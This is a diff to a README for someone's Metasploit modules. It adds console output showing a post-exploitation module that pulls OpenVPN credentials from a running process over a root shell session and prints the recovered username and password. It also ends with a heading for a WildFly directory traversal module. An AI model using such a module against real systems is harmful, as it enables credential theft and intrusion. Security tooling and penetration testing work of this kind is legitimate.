@@ -1,6 +1,56 @@
 ## Modules for metasploit
 Some modules that I created for fun. :)
 
+### openvpn_credentials.rb
+Grab OpenVPN Credentials via Post Module
+
+Output:
+```
+msfdevel 192.168.0.4 shell[s]:0 job[s]:0 msf> exploit(handler)  exploit 
+
+[*] Starting the payload handler...
+[*] Started bind handler
+[*] Command shell session 3 opened (192.168.0.4:34386 -> 192.168.0.4:4444) at 2015-10-19 23:22:41 -0200
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+ps aux | grep openvpn
+root      4935  0.0  0.0   6792  1948 pts/13   S+   23:21   0:00 sudo openvpn --config vpnbook-euro1-tcp443.ovpn
+root      4936  0.0  0.1   5564  2808 pts/13   S+   23:21   0:00 openvpn --config vpnbook-euro1-tcp443.ovpn
+root      5261  0.0  0.0   4676   820 pts/0    S+   23:23   0:00 grep openvpn
+espreto  28130  0.0  1.0 275532 20720 ?        Ssl  22:39   0:02 gvim modules/post/linux/gather/openvpn_credentials.rb
+^Z
+Background session 3? [y/N]  y
+msfdevel 192.168.0.4 shell[s]:1 job[s]:0 msf> exploit(handler)  use post/linux/gather/openvpn_credentials 
+msfdevel 192.168.0.4 shell[s]:1 job[s]:0 msf> post(openvpn_credentials)  set SESSION 3
+SESSION => 3
+msfdevel 192.168.0.4 shell[s]:1 job[s]:0 msf> post(openvpn_credentials)  set PID 4936
+PID => 4936
+msfdevel 192.168.0.4 shell[s]:1 job[s]:0 msf> post(openvpn_credentials)  run
+
+[+] Module running as "root" user
+[*] OpenVPN Credentials stored in /home/espreto/.msf4/loot/20151019232421_default_192.168.0.4_openvpn.creds_333181.txt
+[*] Post module execution completed
+msfdevel 192.168.0.4 shell[s]:1 job[s]:0 msf> post(openvpn_credentials)  cat /home/espreto/.msf4/loot/20151019232421_default_192.168.0.4_openvpn.creds_333181.txt
+[*] exec: cat /home/espreto/.msf4/loot/20151019232421_default_192.168.0.4_openvpn.creds_333181.txt
+
+User: vpnbook
+Pass: 8uWrepAw
+msfdevel 192.168.0.4 shell[s]:1 job[s]:0 msf> post(openvpn_credentials)  set VERBOSE true
+VERBOSE => false
+msfdevel 192.168.0.4 shell[s]:1 job[s]:0 msf> post(openvpn_credentials)  run
+
+[+] Module running as "root" user
+[+] OpenVPN Credentials:
+User: vpnbook
+Pass: 8uWrepAw
+[*] OpenVPN Credentials stored in /home/espreto/.msf4/loot/20151019232835_default_192.168.0.4_openvpn.creds_761404.txt
+[*] Post module execution completed
+msfdevel 192.168.0.4 shell[s]:1 job[s]:0 msf> post(openvpn_credentials)
+```
+
+
+---
 ### wildfly_traversal.rb
 WildFly 8 (JBossAS) Directory Traversal
 
